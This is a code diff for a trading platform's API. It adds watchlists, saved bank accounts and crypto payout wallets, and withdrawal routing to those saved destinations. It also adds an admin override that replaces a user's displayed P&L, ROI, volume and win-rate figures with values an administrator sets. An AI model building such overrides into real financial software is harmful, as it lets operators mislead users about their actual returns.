@@ -342,7 +342,9 @@ router.get('/stats', async (req, res) => {
   const since = (ms: number) => closed.filter((o) => o.closedAt && now - new Date(o.closedAt as Date).getTime() <= ms).reduce((s, o) => s + (o.realizedPnl ? parseFloat(o.realizedPnl.toString()) : 0), 0);
   const netDeposits = (deposits._sum.amount ? parseFloat(deposits._sum.amount.toString()) : 0) - (withdrawals._sum.amount ? parseFloat(withdrawals._sum.amount.toString()) : 0);
 
-  res.json({
+  const tradingVolume = closed.reduce((s, o) => s + parseFloat(o.amount.toString()) * parseFloat(o.price.toString()), 0);
+
+  const base = {
     mode,
     totalTrades: closed.length,
     wins: wins.length,
@@ -353,6 +355,9 @@ router.get('/stats', async (req, res) => {
     grossProfit,
     grossLoss,
     realizedPnl: totalRealized,
+    unrealizedPnl: 0,
+    lifetimePnl: totalRealized,
+    tradingVolume,
     bestTrade: pnls.length ? Math.max(...pnls) : 0,
     worstTrade: pnls.length ? Math.min(...pnls) : 0,
     avgDurationMs,
@@ -363,29 +368,202 @@ router.get('/stats', async (req, res) => {
     monthlyProfit: since(30 * 24 * 3600 * 1000),
     netDeposits,
     roi: netDeposits > 0 ? (totalRealized / netDeposits) * 100 : 0,
-  });
+    overridden: false,
+  };
+
+  // Admin P&L Manager overrides (any non-null field wins). See docs/08 §4.
+  const ov = await prisma.statOverride.findUnique({ where: { userId_mode: { userId: uid, mode } } });
+  if (ov) {
+    const map: [keyof typeof base, number | null][] = [
+      ['realizedPnl', ov.realizedPnl], ['unrealizedPnl', ov.unrealizedPnl], ['dailyProfit', ov.dailyPnl],
+      ['weeklyProfit', ov.weeklyPnl], ['monthlyProfit', ov.monthlyPnl], ['lifetimePnl', ov.lifetimePnl],
+      ['roi', ov.roi], ['tradingVolume', ov.tradingVolume], ['winRate', ov.winRate], ['lossRate', ov.lossRate],
+    ];
+    for (const [k, v] of map) if (v != null) { (base as Record<string, unknown>)[k] = v; base.overridden = true; }
+  }
+
+  res.json(base);
 });
 
 // ---------------------------------------------------------------------------
-// Watchlist (favourite markets)
+// Watchlists (named, private, per user). The legacy /watchlist endpoints act on
+// the user's default "Favorites" list for backward compatibility.
 // ---------------------------------------------------------------------------
+
+// Resolve (and lazily create) the user's default watchlist, adopting any legacy
+// items that were not yet assigned to a list.
+async function ensureDefaultWatchlist(userId: string) {
+  let list = await prisma.watchlist.findFirst({ where: { userId, isDefault: true } });
+  if (!list) list = await prisma.watchlist.findFirst({ where: { userId }, orderBy: { createdAt: 'asc' } });
+  if (!list) list = await prisma.watchlist.create({ data: { userId, name: 'Favorites', emoji: '⭐', isDefault: true } });
+  // Adopt orphaned legacy items into the default list.
+  await prisma.watchlistItem.updateMany({ where: { userId, watchlistId: null }, data: { watchlistId: list.id } });
+  return list;
+}
+
+// Legacy: flat list of symbols across all of the user's lists (deduped) — keeps
+// the markets/coin star working exactly as before.
 router.get('/watchlist', async (req, res) => {
+  await ensureDefaultWatchlist(req.user!.id);
   const items = await prisma.watchlistItem.findMany({ where: { userId: req.user!.id }, orderBy: { createdAt: 'asc' } });
-  res.json(items.map((i) => i.symbol));
+  res.json([...new Set(items.map((i) => i.symbol))]);
 });
 router.post('/watchlist', async (req, res) => {
   const parsed = z.object({ symbol: z.string().min(3).max(20) }).safeParse(req.body);
   if (!parsed.success) return res.status(400).json({ error: 'Invalid symbol' });
   const symbol = parsed.data.symbol.toUpperCase();
+  const list = await ensureDefaultWatchlist(req.user!.id);
   await prisma.watchlistItem.upsert({
-    where: { userId_symbol: { userId: req.user!.id, symbol } },
-    create: { userId: req.user!.id, symbol },
+    where: { watchlistId_symbol: { watchlistId: list.id, symbol } },
+    create: { userId: req.user!.id, watchlistId: list.id, symbol },
     update: {},
   });
   res.status(201).json({ ok: true, symbol });
 });
 router.delete('/watchlist/:symbol', async (req, res) => {
   await prisma.watchlistItem.deleteMany({ where: { userId: req.user!.id, symbol: req.params.symbol.toUpperCase() } });
+  res.json({ ok: true });
+});
+
+// Named multi-list management.
+router.get('/watchlists', async (req, res) => {
+  await ensureDefaultWatchlist(req.user!.id);
+  const lists = await prisma.watchlist.findMany({
+    where: { userId: req.user!.id },
+    orderBy: [{ isDefault: 'desc' }, { createdAt: 'asc' }],
+    include: { items: { orderBy: { createdAt: 'asc' } } },
+  });
+  res.json(lists.map((l) => ({ id: l.id, name: l.name, emoji: l.emoji, isDefault: l.isDefault, symbols: l.items.map((i) => i.symbol) })));
+});
+router.post('/watchlists', async (req, res) => {
+  const parsed = z.object({ name: z.string().min(1).max(40), emoji: z.string().max(8).optional() }).safeParse(req.body);
+  if (!parsed.success) return res.status(400).json({ error: 'Invalid list' });
+  const count = await prisma.watchlist.count({ where: { userId: req.user!.id } });
+  if (count >= 20) return res.status(409).json({ error: 'Watchlist limit reached' });
+  const list = await prisma.watchlist.create({ data: { userId: req.user!.id, name: parsed.data.name, emoji: parsed.data.emoji } });
+  res.status(201).json({ id: list.id, name: list.name, emoji: list.emoji, isDefault: list.isDefault, symbols: [] });
+});
+router.patch('/watchlists/:id', async (req, res) => {
+  const parsed = z.object({ name: z.string().min(1).max(40).optional(), emoji: z.string().max(8).optional() }).safeParse(req.body);
+  if (!parsed.success) return res.status(400).json({ error: 'Invalid update' });
+  const list = await prisma.watchlist.findFirst({ where: { id: req.params.id, userId: req.user!.id } });
+  if (!list) return res.status(404).json({ error: 'List not found' });
+  const updated = await prisma.watchlist.update({ where: { id: list.id }, data: { name: parsed.data.name, emoji: parsed.data.emoji } });
+  res.json({ id: updated.id, name: updated.name, emoji: updated.emoji, isDefault: updated.isDefault });
+});
+router.delete('/watchlists/:id', async (req, res) => {
+  const list = await prisma.watchlist.findFirst({ where: { id: req.params.id, userId: req.user!.id } });
+  if (!list) return res.status(404).json({ error: 'List not found' });
+  if (list.isDefault) return res.status(409).json({ error: 'Cannot delete the default list' });
+  await prisma.watchlist.delete({ where: { id: list.id } });
+  res.json({ ok: true });
+});
+router.post('/watchlists/:id/items', async (req, res) => {
+  const parsed = z.object({ symbol: z.string().min(3).max(20) }).safeParse(req.body);
+  if (!parsed.success) return res.status(400).json({ error: 'Invalid symbol' });
+  const list = await prisma.watchlist.findFirst({ where: { id: req.params.id, userId: req.user!.id } });
+  if (!list) return res.status(404).json({ error: 'List not found' });
+  const symbol = parsed.data.symbol.toUpperCase();
+  await prisma.watchlistItem.upsert({
+    where: { watchlistId_symbol: { watchlistId: list.id, symbol } },
+    create: { userId: req.user!.id, watchlistId: list.id, symbol },
+    update: {},
+  });
+  res.status(201).json({ ok: true, symbol });
+});
+router.delete('/watchlists/:id/items/:symbol', async (req, res) => {
+  const list = await prisma.watchlist.findFirst({ where: { id: req.params.id, userId: req.user!.id } });
+  if (!list) return res.status(404).json({ error: 'List not found' });
+  await prisma.watchlistItem.deleteMany({ where: { watchlistId: list.id, symbol: req.params.symbol.toUpperCase() } });
+  res.json({ ok: true });
+});
+
+// ---------------------------------------------------------------------------
+// Withdrawal methods — saved bank accounts + crypto payout wallets. Strictly
+// per-user; exactly one default of each type (enforced in a transaction).
+// ---------------------------------------------------------------------------
+
+const bankSchema = z.object({
+  accountHolderName: z.string().min(2).max(120),
+  bankName: z.string().min(2).max(120),
+  accountNumber: z.string().min(2).max(64),
+  iban: z.string().max(64).optional().or(z.literal('')),
+  swiftBic: z.string().max(32).optional().or(z.literal('')),
+  branchName: z.string().max(120).optional().or(z.literal('')),
+  branchAddress: z.string().max(240).optional().or(z.literal('')),
+  country: z.string().min(2).max(80),
+  currency: z.string().min(2).max(8),
+  isDefault: z.boolean().optional(),
+});
+
+router.get('/bank-accounts', async (req, res) => {
+  const rows = await prisma.bankAccount.findMany({ where: { userId: req.user!.id }, orderBy: [{ isDefault: 'desc' }, { createdAt: 'desc' }] });
+  res.json(rows);
+});
+router.post('/bank-accounts', async (req, res) => {
+  const parsed = bankSchema.safeParse(req.body);
+  if (!parsed.success) return res.status(400).json({ error: 'Invalid bank account' });
+  const d = parsed.data;
+  const existing = await prisma.bankAccount.count({ where: { userId: req.user!.id } });
+  const makeDefault = d.isDefault || existing === 0;
+  const row = await prisma.$transaction(async (tx) => {
+    if (makeDefault) await tx.bankAccount.updateMany({ where: { userId: req.user!.id }, data: { isDefault: false } });
+    return tx.bankAccount.create({ data: { userId: req.user!.id, ...d, iban: d.iban || null, swiftBic: d.swiftBic || null, branchName: d.branchName || null, branchAddress: d.branchAddress || null, isDefault: makeDefault } });
+  });
+  res.status(201).json(row);
+});
+router.post('/bank-accounts/:id/default', async (req, res) => {
+  const row = await prisma.bankAccount.findFirst({ where: { id: req.params.id, userId: req.user!.id } });
+  if (!row) return res.status(404).json({ error: 'Not found' });
+  await prisma.$transaction([
+    prisma.bankAccount.updateMany({ where: { userId: req.user!.id }, data: { isDefault: false } }),
+    prisma.bankAccount.update({ where: { id: row.id }, data: { isDefault: true } }),
+  ]);
+  res.json({ ok: true });
+});
+router.delete('/bank-accounts/:id', async (req, res) => {
+  const del = await prisma.bankAccount.deleteMany({ where: { id: req.params.id, userId: req.user!.id } });
+  if (del.count === 0) return res.status(404).json({ error: 'Not found' });
+  res.json({ ok: true });
+});
+
+const walletSchema = z.object({
+  label: z.string().min(1).max(60),
+  asset: z.enum(['BTC', 'ETH', 'USDT', 'USDC', 'BNB', 'SOL', 'XRP', 'DOGE', 'ADA', 'LTC']),
+  network: z.string().min(2).max(40),
+  address: z.string().min(6).max(140),
+  memoTag: z.string().max(120).optional().or(z.literal('')),
+  isDefault: z.boolean().optional(),
+});
+
+router.get('/payout-wallets', async (req, res) => {
+  const rows = await prisma.payoutWallet.findMany({ where: { userId: req.user!.id }, orderBy: [{ isDefault: 'desc' }, { createdAt: 'desc' }] });
+  res.json(rows);
+});
+router.post('/payout-wallets', async (req, res) => {
+  const parsed = walletSchema.safeParse(req.body);
+  if (!parsed.success) return res.status(400).json({ error: 'Invalid payout wallet' });
+  const d = parsed.data;
+  const existing = await prisma.payoutWallet.count({ where: { userId: req.user!.id } });
+  const makeDefault = d.isDefault || existing === 0;
+  const row = await prisma.$transaction(async (tx) => {
+    if (makeDefault) await tx.payoutWallet.updateMany({ where: { userId: req.user!.id }, data: { isDefault: false } });
+    return tx.payoutWallet.create({ data: { userId: req.user!.id, ...d, memoTag: d.memoTag || null, isDefault: makeDefault } });
+  });
+  res.status(201).json(row);
+});
+router.post('/payout-wallets/:id/default', async (req, res) => {
+  const row = await prisma.payoutWallet.findFirst({ where: { id: req.params.id, userId: req.user!.id } });
+  if (!row) return res.status(404).json({ error: 'Not found' });
+  await prisma.$transaction([
+    prisma.payoutWallet.updateMany({ where: { userId: req.user!.id }, data: { isDefault: false } }),
+    prisma.payoutWallet.update({ where: { id: row.id }, data: { isDefault: true } }),
+  ]);
+  res.json({ ok: true });
+});
+router.delete('/payout-wallets/:id', async (req, res) => {
+  const del = await prisma.payoutWallet.deleteMany({ where: { id: req.params.id, userId: req.user!.id } });
+  if (del.count === 0) return res.status(404).json({ error: 'Not found' });
   res.json({ ok: true });
 });
 
@@ -461,12 +639,29 @@ const withdrawSchema = z.object({
   amount: z.number().positive(),
   network: z.string().optional(),
   address: z.string().optional(),
+  payoutWalletId: z.string().optional(),
+  bankAccountId: z.string().optional(),
 });
 router.post('/withdraw', async (req, res) => {
   const mode = getMode(req);
   const parsed = withdrawSchema.safeParse(req.body);
   if (!parsed.success) return res.status(400).json({ error: 'Invalid withdrawal' });
-  const { asset, amount, network, address } = parsed.data;
+  const { asset, amount } = parsed.data;
+  let { network, address } = parsed.data;
+  let methodNote: string | undefined;
+
+  // Resolve a saved destination (ownership-checked) if one was chosen.
+  if (parsed.data.payoutWalletId) {
+    const w = await prisma.payoutWallet.findFirst({ where: { id: parsed.data.payoutWalletId, userId: req.user!.id } });
+    if (!w) return res.status(404).json({ error: 'Payout wallet not found' });
+    network = w.network; address = w.address;
+    methodNote = `Crypto payout → ${w.label} (${w.asset}/${w.network})`;
+  } else if (parsed.data.bankAccountId) {
+    const b = await prisma.bankAccount.findFirst({ where: { id: parsed.data.bankAccountId, userId: req.user!.id } });
+    if (!b) return res.status(404).json({ error: 'Bank account not found' });
+    address = b.accountNumber; network = 'Bank Transfer';
+    methodNote = `Bank transfer → ${b.bankName} (${b.accountHolderName})`;
+  }
   const fee = +(amount * 0.001).toFixed(8); // 0.1% demo network fee
 
   // Reserve the funds immediately so the withdrawn amount can no longer be
@@ -491,7 +686,7 @@ router.post('/withdraw', async (req, res) => {
         data: { balance: { decrement: amount }, locked: { increment: amount } },
       });
       return tx.transaction.create({
-        data: { userId: req.user!.id, mode, type: 'WITHDRAWAL', asset, network, address, amount, fee, status: 'PENDING', reference: `WD-${Date.now()}` },
+        data: { userId: req.user!.id, mode, type: 'WITHDRAWAL', asset, network, address, amount, fee, status: 'PENDING', reference: `WD-${Date.now()}`, note: methodNote },
       });
     });
     await audit({ actorId: req.user!.id, action: 'withdrawal.request', target: txn.id, meta: { mode, amount, asset }, ip: req.ip });
